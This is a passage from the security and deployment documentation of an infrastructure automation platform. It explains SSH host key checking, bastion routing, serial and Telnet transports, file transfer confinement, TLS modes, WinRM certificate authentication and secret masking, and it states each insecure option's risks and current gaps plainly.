authentication this was waiting on. What has NOT changed is the payload: a dispatch
still carries the resolved credential itself, and authentication changes who may read
the stream rather than what is written to it. Reference passing is the separate piece
of work that removes the secret from the message.

Until it lands, treat the stream as holding secrets and size its retention
accordingly.

### Host key verification, and where a container gets its known_hosts

Every SSH connection Pleiades makes verifies the device's host key against an
OpenSSH-format `known_hosts` file, and fails closed when it cannot. There is no
trust on first use: a device with no entry is refused, and so is a device whose key
stopped matching the entry it has. That is the behavior of `ssh` with
`StrictHostKeyChecking=yes`, and it is deliberate, because the alternative is that a
machine in the middle can answer for a device and collect the credential you were
about to send it.

The file is resolved from the first of three sources that names one:

1. whatever the caller passed for that one connection;
2. the `PLEIADES_KNOWN_HOSTS` environment variable, which is how a deployment
   configures the whole process;
3. `$HOME/.ssh/known_hosts`, which is where you already keep yours.

Most specific wins, the same order `ssh` itself uses. On the Crawl tier the third
entry means the CLI simply reuses the file you have, and there is nothing to
configure.

**In a container there is no third entry, so this is a required deployment step.**
The runner image is distroless and has no home directory, so it sets
`PLEIADES_KNOWN_HOSTS=/app/ssh/known_hosts` and ships that directory empty. Mount a
real file over it or every SSH task refuses, naming that path. The chart takes a
ConfigMap or a Secret:

```bash
ssh-keyscan -H device-a.example.com device-b.example.com > known_hosts
kubectl create configmap pleiades-known-hosts --from-file=known_hosts
helm upgrade pleiades ./helm/the-pleiades \
  --set runner.knownHosts.configMapName=pleiades-known-hosts
```

The key inside the object has to be named `known_hosts`; the chart mounts that name
specifically, so a wrongly-keyed object leaves the pod unable to start rather than
running with no host keys. Compose has the same mount commented into
`docker-compose.yml` with both shapes.

Nothing is baked into the image on purpose. Host keys in an image mean rebuilding it
to add a device, and an empty file would be worse than none: it parses and matches
nothing, so every connection would fail with a per-device "no entry" message instead
of one clear message about a mount nobody made.

**The escape hatch, and what it costs.** A task may set
`insecure_skip_host_key_verify: true`, which skips verification for that task only.
It is a per-task parameter rather than a setting precisely so it appears in the
runbook next to the command it applies to, where review can see it; there is
deliberately no environment variable or chart value that turns verification off
fleet-wide. Use it for a throwaway lab and treat it as a finding anywhere else. Note
that until recently this was the only thing that worked inside the shipped runner
image, so a runbook inherited from that period may be carrying it for a reason that
no longer exists.

### Onboarding a generic device from the Controller

The onboarding route runs the probe in the Controller process, as a sync does: the
Controller connects to the device, not a Runner. So the Controller needs what a probe
needs: the device's credential in the same per-device store a dispatch reads
(`CONTROLLER_CREDENTIALS_DIR`), the device's host key in its known_hosts
(`PLEIADES_KNOWN_HOSTS`, or its own `~/.ssh/known_hosts`) for `generic_ssh` and
`generic_netconf`, and a trust store holding the certificate authority of a
`generic_http` or `generic_grpc` device (the system's, or `SSL_CERT_FILE`). No probe skips a
host key or a certificate check, and there is no setting that makes one.

The route needs `inventory:onboard`, which operators and admins hold and which
`inventory:write` does not imply: onboarding reaches a device with a secret and is the only
way a device gains a capability its type does not declare. Each call is logged with its
caller and outcome, and the discovery and every state change it makes are revisions in the
device's history.

What each probe sends the device is fixed. The SSH probe runs one constant script, which
reads `uname`, `/etc/os-release` (read line by line, never executed) and whether a set of
commands exists. The HTTP probe sends one GET of the base URL, and of `openapi_path` when set,
and follows no redirect, so the credential reaches the base URL's origin and nowhere else;
`basic` or `bearer` authentication is refused on an `http://` base URL. The gRPC probe calls
the standard health and reflection services, sends a stored credential as a bearer token
only over TLS, and refuses outright when a credential is stored and `grpc_plaintext` is true.
What a device answers is kept only as bounded text (256 bytes a value, 256 entries a list),
with control and formatting characters removed, and is escaped again wherever it is printed.

One limit applies on the Walk tier. A Runner rebuilds a dispatched device from its SSH address
and its capability names, not from its type, so a method that reads any other device accessor
cannot read it there: `http.request`'s device mode (the base URL), `net.netconf.config` (the
NETCONF port), and the generic `pkg.*` and `svc.*` methods (the manager's name, which picks
`apt` or `dnf`, `systemd` or Windows). Each refuses by name rather than guessing. The
manager-specific methods, such as `pkg.apt.install` and `svc.systemd.restart`, read no accessor
and run on a Runner as they do anywhere. On the Crawl tier, `pleiades run` has the whole device
and all of them work.

### Connection persistence

A run keeps one SSH connection per device open between that device's tasks, the way
Ansible's `ControlPersist` does, so a runbook of ten tasks against a device logs in
once rather than ten times. On the CLI the connection lasts for the `pleiades run`; on
the Controller and Runner it lasts for one device's dispatch. Either way it closes when
the run ends, or after 60 seconds without a task. Measured against a real root `sshd`
([Performance compared with Ansible](15-performance.md)), ten tasks on one host took 0.10 s with
it and 0.63 s without, and 200 hosts took 3.2 s against 23.7 s at 5 devices at a time; the run
logs in once per device instead of once per task.

It is on by default and can be turned off at two ladders. **Off at either one is off.**

- **The run's own setting.** `pleiades run --persist-connections=false` on the CLI, or
  the `persist_connections` launch field (`on` or `off`) on a job template, a saved
  configuration or a launch, resolved like every other launch field: the most specific
  layer that sets it wins.
- **The device's hierarchy.** A `persist_connections: false` property on an inventory, a
  group or a device (`pleiades add-host web --set persist_connections=false` on the
  CLI). The most specific level that sets it wins, so a device can turn it back on
  beneath a group that turned it off. A value that is not a boolean reads as off, so a
  mistyped `"no"` or a quoted `"true"` never leaves it on by accident.

**When a kept connection is not reused.** Reuse is refused, and a fresh login made
instead, whenever reuse could mean anything a fresh login would not:

- the task's address, credential, host key setting or `known_hosts` file differs from
  the one the connection was made with;
- the `known_hosts` file has changed at all since the login, so a host key you just
  removed is checked again at once rather than honored through an older login;
- the connection does not answer an SSH keepalive. A dead one is replaced before any
  command is sent. A device that gives no answer within three seconds is not kept for
  the rest of the run, so it costs a fresh login per task rather than a timeout per
  task;
- the last task on it opened an interactive terminal (`net.cli.*`, `net.ios.*`), a
  NETCONF session or a streamed transfer, or had a command cut off by a timeout or a
  cancel. That connection is closed rather than handed to the next task, since whatever
  state it was left in is not the next task's to inherit.

`net.ssh.ping` always logs in afresh, because proving that a login works right now is
what it is for. The legacy transport actions (`ssh_exec` and its kin, with their
routes through a jump host) are not kept either, and neither are the connections an
external Collection program makes, since each call to one is its own process.

**Changes to the login itself.** A connection made before a change to the account it
logs in as does not see that change: a group it was just added to, a new shell, a
changed limit, or a new `AllowUsers` line in `sshd_config`. The `identity.user.*` and
`identity.group.*` methods close the connection after a real run for exactly that
reason. For a change they cannot see, such as `usermod` run through `exec.command`, add
a `pleiades.builtin.connection.reset` task, which is Ansible's `meta: reset_connection`
and is what `migrate-playbook` converts that to. The next task logs in again.

**Why you might turn it off.** The trade is fewer logins against a login that lasts
longer:

- a credential revoked on the device part way through a run does not stop tasks that
  run over a connection made before the revocation;
- a device whose session log is your audit trail records one session for the run's
  tasks rather than one per task;
- on the Runner, one process serves every task of a dispatch, so the dispatch's
  credential stays in that process's memory for the dispatch rather than for one task.
  It already travels on the dispatch message itself, so this lengthens how long it is
  held rather than where.

Turn it off where a per-task login or an immediate revocation matters more than the
time saved. With it off, each task logs in and closes exactly as it did before this
setting existed.

A Controller older than this setting sends dispatches without it, and a Runner reads
that as off. A Runner older than it ignores it and logs in per task.

### Bastions and hop chains

A device that is only reachable through a jump host does not need a second
transport or a special task parameter. Configure a `route` on whichever level of
the hierarchy the bastion actually applies to: a single device, a group of
devices, or a whole inventory. Most specific wins, the same rule every other
layered setting in Pleiades follows (a group-level bastion with a per-device
override behaves exactly like a group-level anything else with a per-device
override). The value is an ordered list of device names, nearest hop first:

```yaml
properties:
  route:
    - jump-host-1
    - jump-host-2
```

Each name in that list must be a real, separately inventoried device with its
own SSH capability and its own stored credential. That is not a convenience
default, it is deliberate: a bastion's account and the production device's
account are almost never the same, so a hop's credential is looked up
independently under its own device name, never inherited from the target and
never falling back to it. A hop with no stored credential of its own fails the
task, naming that hop, rather than silently trying the target's password
against it. If you see a task fail with an error naming a device you did not
expect, that device is a hop in the resolved route, and the fix is to store a
credential for it like any other device.

**Every hop gets its own host key check.** The tunneled connection to hop two
is a second, fully independent SSH handshake carried inside the encrypted
channel hop one already established, and it is verified against `known_hosts`
exactly like a direct connection would be: an unrecognized or mismatched key
at any hop refuses the connection and names that hop specifically. This is
what actually defends against a compromised bastion. A jump host that can see
your traffic sees ciphertext only, past its own hop, and a bastion that tried
to redirect the tunneled connection somewhere else would be caught by that
next hop's own key check, not by anything the bastion itself could suppress.

A route may name at most sixteen hops. Real bastion topologies are one or two
layers deep; the bound exists so a misconfigured or attacker-influenced
`route` value fails immediately, before any inventory or credential lookup for
any of its entries, rather than resolving into a chain long enough to make a
single task pay for dozens of failed dials one at a time.

**A `route` reaches a non-SSH endpoint too.** `serial_exec`, `serialtcp_exec`,
and `telnet_exec` (below) tunnel through the identical hop chain: every hop is
still a real, independent SSH connection with its own host key check and its
own credential, and only the final leg speaks the target protocol instead of
SSH. A console server on a management network behind a jump host needs
nothing beyond the same `route` property this section already describes.

### Serial, console servers, Telnet and TFTP

These transports reach a target that is not "a device with SSH on it": a
directly attached serial line, a console or terminal server proxying one over
TCP, genuinely old gear with nothing but Telnet, or a file moved by TFTP
instead of a command run over a session. Each one trades away something SSH
gives you for free — authentication, encryption, or both — and each one says
so loudly rather than quietly, through a task parameter that has to be set on
purpose next to the command it applies to.

**First, the device type that carries these capabilities: `console_device`.**
None of the tasks below can run against a `linux_server` or a `cisco_router`,
and that is deliberate rather than an omission. A Linux server reached over
SSH is not cabled to a console; claiming otherwise would let a runbook pass
validation and then dial nothing. Console-reachable gear is its own inventory
type:

```yaml
hosts:
  # A switch on a terminal server port, staged before it has a management
  # address. Reachable by serialtcp_exec, and by nothing else.
  - name: sw-staging-01
    type: console_device
    properties:
      raw_passthrough_host: ts1.mgmt.example.net
      raw_passthrough_port: 2003

  # A channel bank cabled to this host's own USB-serial adapter.
  - name: pbx-annex
    type: console_device
    properties:
      serial_device: /dev/ttyUSB0
      serial_baud: 9600
      serial_data_bits: 8
      serial_parity: none
      serial_stop_bits: "1"

  # Genuinely old gear with nothing but Telnet.
  - name: rtr-1994
    type: console_device
    properties:
      telnet_host: 10.20.30.40
```

The properties are what decide which capability the device declares, one
reach path at a time:

| Property | Declares | Notes |
|---|---|---|
| `serial_device` | `SerialCapable` | The operating system's own name for the port. Opaque: `COM3` is as valid as `/dev/ttyUSB0`. |
| `serial_baud`, `serial_data_bits`, `serial_parity`, `serial_stop_bits` | *(line settings only)* | Optional. Default to 9600 8-N-1, the console setting mainstream gear ships with. |
| `raw_passthrough_host` + `raw_passthrough_port` | `RawPassthroughCapable` | Both required. There is no default port: per-line numbering is vendor specific (Digi from 2001, Opengear and Lantronix from 3001), so guessing would dial somebody else's line on the same unit. |
| `rfc2217_host` + `rfc2217_port` | `RFC2217Capable` | Both required, same reason. `rfc2217_baud` and its siblings configure this line independently of `serial_*`. |
| `telnet_host` | `TelnetCapable` | `telnet_port` defaults to 23, which is a real convention rather than a guess. |

A device configured for one path does not claim the others, so
`pleiades validate` rejects a `serial_exec` task aimed at a Telnet-only
device before anything runs. A line setting that does not parse is refused
when the inventory is read, not defaulted past: a wrong parity or baud rate
does not fail a serial line, it silently corrupts every byte crossing it.

**Local serial (`serial_exec`).** A device declaring `SerialCapable`
advertises a serial port identifier (`/dev/ttyUSB0` on Linux,
`/dev/tty.usbserial-*` on macOS, `COM3` on Windows) and a line configuration
— baud rate, data bits, parity, stop bits. That identifier is opaque: it is
never parsed, joined, or validated as a filesystem path, because `COM3` is
not one and even the POSIX names are an identifier the operating system
assigns, not a path Pleiades constructs. This is the one transport in this
section requiring no opt-in, because a directly attached serial line has the
same physical-access trust model a local console does.

**Console servers: two genuinely different claims about the same wire.** A
console or terminal server (Digi, Opengear, Lantronix, Perle,
Avocent/Cyclades) proxies a serial line as a TCP port, and it does so in one
of two ways that Pleiades treats as separate capabilities rather than a
flag, because they are different claims about what the target can do:

| Capability | Task fqcn | What it offers | Opt-in |
|---|---|---|---|
| `RawPassthroughCapable` | `serialtcp_exec` | A bare byte pipe: zero framing, zero authentication, zero encryption at the protocol level. No line control at all — no baud rate, no DTR/RTS, no break. | `insecure_raw_passthrough: true` |
| `RFC2217Capable` | *(none yet — see below)* | A real control channel (RFC 2217, the Telnet Com Port Control Option) negotiating baud rate, data bits, parity, stop bits, and asserting DTR/RTS/break, layered onto a Telnet session. | *(not yet reachable from a runbook)* |

`serialtcp_exec` is refused outright without `insecure_raw_passthrough: true`
set as a task parameter, checked before any network I/O — the same "explicit,
loud opt-in, never a fallback silently taken" shape
`insecure_skip_host_key_verify` already established above. There is nothing
this transport can do to make the connection itself safer; the opt-in exists
so that decision is visible in the runbook, not buried in a device property
nobody reviews.

**RFC 2217 is a real, tested client with no runbook task yet.** The
negotiation, line-setting, and modem-control logic lives in `pkg/rfc2217` and
is proven against a real `ser2net` access server, including a genuine
observed baud change and a genuine observed break condition on the far side
— the one thing that actually distinguishes RFC 2217 from raw passthrough.
What does not exist yet is an `engine.TransportBinding` for it: "assert DTR"
and "send a break" are not command strings, so this capability is reachable
today only by a future Collection method built directly against the library,
not by a task fqcn in a runbook. If you are looking for that fqcn, it is not
missing by oversight — it is not built yet.

**Telnet (`telnet_exec`).** Genuinely ancient gear with no SSH at all still
exists, and Ansible ships `ansible.netcommon.telnet` for exactly the reason
stated in its own documentation: to enable SSH on a device that only has
Telnet enabled by default. A device declaring `TelnetCapable` is reachable
the same way, behind its own `insecure_telnet: true` opt-in — Telnet sends
everything, credentials included, in cleartext, with no encryption at any
layer. Use it to bootstrap SSH onto a device and stop using it once that is
done.

**Every one of these three reports `exit_status_unknown: true`.** A serial
console, a raw byte pipe, and a bare Telnet session have no concept of a
process exit code — only a real shell session does, and none of these is
one. `stdout`/`stderr` are captured and recorded either way, but nothing in
Pleiades infers success from a non-zero code that was never there in the
first place; a `when` or `when_cel` assertion against the captured text is
how a runbook judges whether a serial command actually succeeded.

**TFTP.** `pkg/tftpxfer` moves a file to or from a TFTP server (RFC 1350,
plus RFC 2347/2348 negotiated options). Say the same thing about it that this
section says about raw passthrough: **no authentication and no encryption at
the protocol level, ever** — any host that can reach the server's UDP port
can read or write any file the server's own filesystem mapping allows, and
nothing in this package can fix that. A remote filename containing `..`, an
absolute path, or a Windows drive letter is refused before a request is ever
sent, which defends against an accidentally or maliciously constructed
traversal on the *remote* filename; it says nothing about the *local* side,
since this package only ever writes to a caller-supplied `io.Writer` and
never constructs a local path itself. A filename is also refused if one
request cannot carry it whole: one holding a control or format character
(a NUL would rewrite the transfer mode), one that is not valid UTF-8, or one
longer than 493 bytes. A block size is accepted only from 512 to 65464.
Like RFC 2217, this is a library (`FileTransferCapable`) with no runbook
task wired to it yet.

TFTP has no integrity check, and one case of that is worth knowing before
setting a block size. A server may answer a block size request with a smaller
size, and the TFTP library this package uses ignores an answer below 512, so
the download ends at the first block and reports success with a truncated
file. Leave the block size unset unless every server it will reach is known
to accept 512 or more, and verify a transferred image's checksum on the
device before using it.

**SFTP and SCP.** `pkg/sftpxfer` and `pkg/scpxfer` move a file's bytes to or
from a device over the SSH connection `pkg/remoteexec` already opens, so they
inherit its host key verification, retry, circuit breaker and bastion hop
chain. Both sit behind one port, `pkg/filexfer`, and both are libraries with
no runbook task wired to them yet. What they promise, and where the promise
stops:

- **Every transfer is confined to one directory.** A `linux_server` declares
  `FileTransferCapable` only when its inventory record sets
  `file_transfer_root`, an absolute path; a record that sets it to something
  unusable (relative, not in its simplest form, holding a control character)
  is refused when inventory loads. There is no default. A root of `/` is
  allowed and confines nothing, which is the operator's choice to make.
- **A path that leaves the root is refused before anything is dialed.** Dot
  segments, absolute paths, doubled slashes, backslashes, NUL and other control
  characters, and invalid UTF-8 are refused by name, on every controller
  operating system.
- **A symlink inside the root cannot lead out of it.** Before any content moves,
  each transfer works out where the target's directory physically is on the
  device and refuses one outside the root, and it never follows a symlink,
  directory, FIFO or device node at the final component. SFTP does this from
  the client, one path component at a time, rather than trusting the server's
  own path canonicalization, which some servers do not base on the real
  filesystem.
- **What is not covered: a race by someone who can write inside the root.**
  SFTP has no way to open a file without following symlinks, so a directory
  swapped for a symlink between the check and the open is not caught; SCP pins
  its working directory and is exposed only at the final component. The
  supported configuration is a transfer root that other local accounts cannot
  write to.
- **A write replaces the target in one step.** Content goes to a private
  directory (mode 0700) beside the target and is renamed into place, so a
  reader sees the old file or the new one, never part of one, and a failed or
  interrupted transfer leaves the old file intact. Replacing makes a new file:
  the old one's owner, group, ACLs and hard links are not carried over. The
  mode is set exactly, and setuid, setgid and sticky bits are refused. An SFTP
  server without the `posix-rename@openssh.com` extension can create a file
  but will not replace one. An SFTP transfer killed mid-stream can leave its
  empty private directory behind; SCP removes its own.
- **SCP needs a POSIX shell on the device.** Legacy SCP runs a short shell
  script next to `scp` in sink or source mode, so it works on Linux and BSD
  servers and not on a network device whose SCP server has no shell behind it.
  A downloaded file goes only to the caller's destination, never to a name the
  device chose, which is the class of attack legacy `scp` clients have been
  caught by.
- **A method built on them cannot reach a device behind a bastion yet.** The
  Collection SDK's `sdk.Connect` dials a device directly and does not follow its
  bastion route; the libraries themselves are proven through a real bastion hop.

**Docker exec is different from all of the above, deliberately.**
`container.docker.exec` (see the [module reference](reference/modules/container/docker/exec.md))
is a real fqcn with a real Manifest, reached over the Docker daemon's own
control socket. Unlike the byte-stream transports above, it reports a
genuine process exit code every time, because Docker's own exec-inspect
endpoint provides one. It is also, by construction rather than convention,
incapable of anything past running one command inside one already-running
container: every request it can send is checked against a fixed, three-entry
allowlist (create an exec instance, start it, inspect its result) before a
byte reaches the socket, and there is no method anywhere in the package that
could be widened into a general passthrough. This matters because the socket
itself is root-equivalent — whoever can reach it can, in general, ask the
daemon to create a privileged container with the host's root filesystem
bind-mounted in — and neither a read-only socket mount nor running the
calling process as non-root actually restricts that; the daemon's own
privilege is what matters, not the caller's. The allowlist is the only real
defense, and it is enforced in one function every request funnels through.

**Digi RealPort is not, and will not be, a protocol Pleiades speaks.**
RealPort is not a wire protocol in the sense RFC 2217 is — it is an
operating-system driver product. Install Digi's own RealPort driver on the
host, and the port it creates behaves like an ordinary local serial device:
reach it with `serial_exec` exactly as you would a directly attached
USB-serial adapter. Pleiades deliberately implements no RealPort client of
its own; doing so would mean re-implementing, in Go, a job the vendor's
driver already does correctly for the operating system.

### PKI and TLS

Two different things, at different stages, and it is worth not confusing them.

**Serving TLS is real and unavoidable.** The Controller terminates TLS from
`TLS_CERT_FILE` and `TLS_KEY_FILE` (TLS 1.2 floor), or serves plain HTTP only when
`PLEIADES_TLS_TERMINATED_UPSTREAM=1` states that an ingress in front of it already
terminated TLS. With neither configured it generates a self-signed certificate,
stores it, and serves that. Setting one of the two files without the other, or both
arrangements at once, is a startup error. This is deliberate rather than strict for
its own sake, because the browser session cookie carries `Secure` and the `__Host-`
prefix unconditionally, and a browser refuses such a cookie on a plain-HTTP origin
without explaining why. Nothing reads `X-Forwarded-Proto` or any other forwarded
header; which arrangement is in use is a setting an operator states, not something
the process infers per request. See
[The web UI](12-web-ui.md#serving-over-tls) for the full table, and note that
certificate rotation still means restarting the process.

**In production, set `TLS_CERT_FILE` and `TLS_KEY_FILE`, or terminate upstream.** The
self-signed certificate is a convenience for a local stack that has to work as one
command. It encrypts the connection and it does not authenticate the server: nothing
your clients already trust vouches for it, so a browser warns and an operator who
clicks through cannot distinguish the Controller from anything else answering on that
address. Treating a warning as routine is itself the risk, because it is the same
warning an interception would produce. A configured certificate always wins over the
generated one, so the production fix is to set the two variables and restart. If you
do run on the generated certificate anyway, note where it lives
(`PLEIADES_TLS_AUTOCERT_DIR`, default `tls` relative to the working directory, which
is `/data` in the container image), that the key is written `0600` inside a `0700`
directory, and that renewal happens only at startup: a process left running past the
certificate's one-year validity serves an expired certificate until it is restarted.

**In Kubernetes, the chart states which arrangement you chose.** The Controller
cannot infer it, for the reason above: a header a client can set is a claim a client
can forge. So `controller.tls.mode` is a value, and each setting produces one of the
three arrangements:

| `controller.tls.mode` | What the pod does | When to use it |
|---|---|---|
| `self-provisioned` (default) | Generates a self-signed certificate into its data volume, reuses it on every later start, serves HTTPS. | A first install. Browsers warn, and clicking through is exactly as weak as it sounds. |
| `secret` | Serves `tls.crt` and `tls.key` from a `kubernetes.io/tls` Secret, which is the shape cert-manager writes. | Production, when TLS terminates in the pod. |
| `upstream` | Serves plain HTTP, because an ingress or a mesh in front of it already terminated TLS. | Production, when TLS terminates at the edge. Only true if it really does: a browser silently drops the session cookie on a plain-HTTP origin, and sign-in then fails with a message about credentials. |

Two details are easy to get wrong and hard to diagnose. The chart sets the liveness
and readiness probe **scheme** from the same value, because a kubelet probing
`http://` at an HTTPS listener never gets a valid answer and the pod would fail its
probes forever. And when the Controller serves its own certificate, the ingress
controller has to speak HTTPS to the backend
(`nginx.ingress.kubernetes.io/backend-protocol: "HTTPS"` on ingress-nginx); getting
that wrong shows up as a 502 with a protocol error in the ingress controller's log
and nothing at all in the Controller's.

**Self-provisioning does not survive a second replica, and the chart refuses to
render one.** Two Controllers generating their own certificates either share one
volume, which is a read-modify-write race over the same key pair, or hold separate
certificates, so a client is handed a different untrusted certificate depending on
which pod answered. Scaling out means `mode: secret` or `mode: upstream`, where every
replica presents the same certificate or none at all. Autoscaling is refused for the
same reason, since its whole purpose is a second replica.

**An mTLS mesh between the Controller and Runners is not.** It is designed
(`internal/pki` declares the interface: sign a CSR, issue a 72-hour certificate) but
not implemented; there is no certificate issuance, rotation, or mTLS enforcement
today. Treat that half as `design`, not `beta`. Nothing in the Helm chart changes
that: the chart configures how a *client* reaches the Controller, and the
Controller-to-Runner path still carries no certificates at all. Traffic between the
Controller, the Runners, the database and the broker is unencrypted inside the
cluster unless you put a service mesh there yourself.

**Presenting a certificate TO a managed device is real, and it is a different
thing.** The paragraph above is about the mesh, Controller to Runner. This is about
the far end: a Runner authenticating to a Windows host over WinRM with a client
certificate instead of a username and a password. It is the first place this
platform presents a client certificate to anything.

Store the certificate as a credential of a `cryptography`-kind type with the inputs
`certificate` and `private_key`, both PEM. **The private key must be unencrypted.**
Nothing decrypts a loose private key on this path, so a passphrase-protected one is
refused by name rather than stored and quietly ignored; if your key has a passphrase,
supply the identity as a PKCS#12 bundle instead, described below, which IS unlocked
at the point of use.

Bind it to a template as you would a machine credential. Two rules follow from what a
certificate is, and both are enforced rather than documented and hoped for:

- A run authenticates as exactly one identity, so a template cannot bind both a
  machine credential and a certificate credential. The write is refused, not just the
  run. One template therefore cannot reach Linux over SSH and Windows by certificate
  in the same run; use two. A `cryptography` credential that carries no certificate,
  such as a signing key, is not an identity and binds alongside a machine credential
  as normal.
- Certificate authentication is HTTPS only, because the WinRM profile it uses sends
  no password and would present nothing at all over plain HTTP. Pleiades selects
  HTTPS itself rather than making you set a flag whose only correct value is true.

**Set the device's `port` property to 5986.** A Windows device defaults to 5985,
the cleartext listener that `Enable-PSRemoting` creates, and that default is
indistinguishable from a deliberate choice. A certificate credential aimed at 5985
is refused with a message saying so, rather than attempted: a TLS handshake against
a plain HTTP listener fails with a transport error about a malformed record, which
reads like a broken certificate and sends whoever gets it to inspect the one thing
that is fine.

**The configuration burden is on the Windows host, not on Pleiades**, and an
operator who has not been told this will read a failed handshake as a defect here.
The target needs an HTTPS WinRM listener, the issuing authority in its trusted
roots, and an explicit certificate-to-account mapping (`New-Item -Path
WSMan:\localhost\ClientCertificate`). The client certificate must carry a UPN in
its subject alternative name and Client Authentication in its extended key usage,
or the mapping cannot match it. One more that is easy to miss because it fails
differently: the mapped account needs WinRM's own service ACL to grant it, not only
membership of `Remote Management Users`. Where it does not, the certificate
authenticates and the session is then refused with a WS-Man `AccessDenied` when it
tries to create a shell. `examples/windows_lab/winrm-cert-setup.ps1` configures all
of this, and `winrm-cert-teardown.ps1` removes it.

**Pleiades caps this path at TLS 1.2, and the reason is a limitation in Go rather than
in Windows.** TLS 1.3 replaced renegotiation with post-handshake authentication, which
is how Windows asks for a client certificate; Go's TLS stack does not implement it, so
over TLS 1.3 the certificate is never sent and the request comes back as an empty
`503`. Windows itself handles TLS 1.3 client certificates correctly, as other clients
demonstrate. Only the certificate path is capped; password authentication negotiates
whatever both ends support.

Treat the cap as permanent rather than as a pending fix. Go's omission is deliberate
and the proposal to add post-handshake authentication is on hold upstream: the relevant
standard forbids it alongside HTTP/2 because it deadlocks multiplexed streams, adding it
would need new server-side interfaces and would fire the client's certificate callback
mid-stream, and it would mean keeping the handshake state machine alive indefinitely
after the connection is established. Plan on TLS 1.2 for this path.

**If you control the target and need TLS 1.3, there is a second option.** The cap exists
because Windows asks for the certificate *late*, after it has seen which URL was
requested. You can tell it to ask during the initial handshake instead, which removes
the need for post-handshake authentication entirely:

```powershell
# inspect first; "Negotiate Client Certificate" is Disabled by default
netsh http show sslcert ipport=0.0.0.0:5986
```

Re-binding that certificate with `clientcertnegotiation=enable` makes TLS 1.3 work with
this client. It is not the default here because it is configuration on every target, and
this platform is built to reach fleets of machines it does not own. Note that Pleiades
currently caps the version unconditionally, so today this only removes the *server* side
of the obstacle; see the gap below.

**Three transport settings are not reachable yet, and this is the honest limit of the
feature.** `pkg/winrmexec` accepts a CA bundle, an HTTPS flag and a verification toggle,
and nothing in a runbook or a device can set any of them; the TLS version cap is a fourth
setting in the same unreachable place. Two consequences follow, and a private PKI
deployment has to plan around both:

- The server's own certificate must be trusted by the **Runner host's system trust
  store**, because there is no way to hand this transport an internal authority.
- Even a target configured for upfront negotiation cannot currently be reached over TLS
  1.3, because the cap cannot be lifted per device.

Making these settable from device properties, the way `port` already is, is the work that
closes both. It is a named gap rather than a design decision.

**A PKCS#12 bundle is the other way to supply the same identity, and the only one that
accepts a passphrase.** Put the base64 of the `.pfx` in a `pfx_bundle` input and bind
its passphrase to an ordinary password credential through `source_field`, described
above; the passphrase is then stored once and rotated in one place. Note that a
binding may only read a secret field into an input that is itself declared secret,
so declare `key_unlock` secret. The bundle stays sealed until the moment it is used:
it is unlocked inside the short-lived process that runs the task, never on the
Controller, so what crosses the message broker is the sealed bundle rather than an
unlocked private key. A bundle and a loose certificate and key pair are
alternatives, and a credential carrying both is refused rather than resolved in
favour of one.

One caveat worth knowing before you are debugging it: the decoder reads DER and not
BER, and bundles written by older Windows tooling are not reliably DER. A bundle
other software opens can still be refused here. Re-exporting it with a current
`Export-PfxCertificate` produces DER.

## Data handling disclosure

Two different things get called "secret" in this codebase, and they are protected
differently. Knowing which one applies to a given value matters for a real
deployment.

### What is encrypted at rest

`Device.properties` (the JSONB bag holding connection details and any
credential-shaped value an inventory source adds) is encrypted transparently by an
ent hook the moment it is written, and decrypted transparently on read. `Fact.payload`
(what a device reports about itself, telemetry) is a deliberate exception: it is
**not** encrypted. This is a data-classification decision made in code, not an
oversight: connection and credential material is treated as secret by default,
while gathered facts are treated as operational telemetry. If a Collection method
ever emits a genuinely sensitive value as a fact, `register_mask`/`secret_mask`
(below) is the mechanism to keep it out of printed and streamed output, but it does
not encrypt the stored fact itself.

`journal_entries` is the second deliberate exception, and it is a different kind of
exception from the first. `Fact.payload` is unencrypted because gathered facts are
classified as operational telemetry, which is a judgement about the value. A journal
entry is unencrypted because it holds no value at all: what it stores is identifiers,
registry-resolved method names, declared key names, status values and counts, and
two architecture tests refuse any field able to carry anything else. There is
nothing there to encrypt rather than a decision not to.

One related disclosure while you are reading this section: `Revision` rows record
inventory changes over time, and what they hold about a device follows the same
rule `Device.properties` does.

### `register_mask` and `secret_mask` are a security contract, not a convenience

`register_mask:` on a task masks one or more fields of that task's own registered
result the instant it registers, before anything downstream can see it unmasked;
dotted paths are supported (`register_mask: response.body.token`). `secret_mask:`
retroactively marks an earlier, already-registered task's top-level fields as
secret; it does not support dotted paths, an intentional asymmetry, not an
oversight. Both require the masked value to be a string at least 8 bytes long:
substring-masking a shorter value risks scrubbing an unrelated, coincidentally
matching substring out of unrelated output, which would be worse than not masking
at all.

**Where masking applies, precisely:**

- Every printed line of the run's own final output (`cmd/pleiades/run.go`) is
  scrubbed using the complete set of values discovered as secret by the time the
  run finished.
- Every live progress event published during the run (the same event stream a
  Walk-tier job log or SSE viewer would read) is scrubbed **best-effort, in
  flight**, using only the secrets known at the moment that specific event is
  published. An event published before a later task marks something secret cannot
  be retroactively scrubbed. This is a real, load-bearing limitation, not a
  hypothetical edge case: a runbook that discovers a secret late should not assume
  every earlier live event was masked.
- `when_cel` conditions always see the real, unmasked value. Masking a value from
  the conditional engine would silently break branching logic that depends on it.

**Where masking applies on the Walk tier:** the distributed execution path (a job
dispatched to a `runner` over NATS) does run real tasks against real devices, and
has since Phase 16, so the paragraph that used to stand here saying otherwise was
out of date. What that path masks today is its own streamed output: the Runner
builds the complete secret set from the run's own `register_mask`/`secret_mask`
discoveries plus every value the Controller attached to the dispatch plus every
value a bound credential injected, and masks through it. Two limits are worth
stating plainly. That set is complete only once the run has finished, so an event
published early in a run is masked against whatever was known at the time. And the
run journal is outside this question entirely rather than covered by it: it stores
no device output to mask.

### Telemetry

OpenTelemetry tracing exists in the control plane (a "Run" click ties to every step
across every device via one trace). What exactly a span attribute carries per
Collection method has not been separately audited against the masking rules above;
treat this as an open item for a future security review, not a settled guarantee.

## Configuration reference

Not yet generated. Each of the four binaries (`pleiades`, `controller`, `runner`,
and the web UI's own server) reads its configuration differently today, and no
single source of truth exists yet to generate a reference from. This page will
follow the same "read from the real source, never hand-maintained" discipline as
the module catalog once one does.

## Backup and restore, data retention and purge

The compose stack has four commands for the second day, each a make target:

| Command | What it does | What it keeps |
|---|---|---|
| `make backup` | Writes a backup of the database to `./backups` | Everything; the stack keeps running |
| `make restore BACKUP=<file>` | Replaces the database with a backup, after checking it | A backup of the database it replaced |
| `make down` | Stops the stack and removes its containers | The database, the broker's messages, `.env` |
| `make decom` | Removes the deployment for good, after a typed confirmation | `./backups`, the images, the checkout |

They run in the stack's one-shot `backup` service, whose image is the controller
binary beside PostgreSQL's own `pg_dump` and `pg_restore` at the server's exact
release. The controller's own image carries neither. For a Helm install, or any
database this stack does not run, nothing here is wired up yet: back that database
